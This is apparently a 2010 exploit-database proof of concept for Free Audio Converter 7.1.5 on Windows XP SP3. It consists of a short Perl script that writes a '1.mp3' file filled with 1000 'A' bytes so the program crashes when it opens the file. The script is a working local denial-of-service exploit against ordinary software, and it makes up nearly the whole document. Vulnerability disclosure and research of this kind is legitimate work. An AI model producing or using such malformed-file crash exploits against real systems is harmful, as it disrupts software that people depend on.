####
####
####Exploit Title: Free Audio Converter 7.1.5 Local Crash PoC
####Software Link: http://www.free-audio-converter.net/
####Tested on: Win XP SP3
####Date: 04-12-2010
####Author:  h1ch4m
####Email: h1ch4m@live.fr
####
####


#Note: all vendor's products are affected.
my $file= "1.mp3";
my $junk = "\x41" x 1000;
open($FILE,">$file");
print $FILE $junk;
close($FILE);
print "File Created successfully\n";
sleep(1);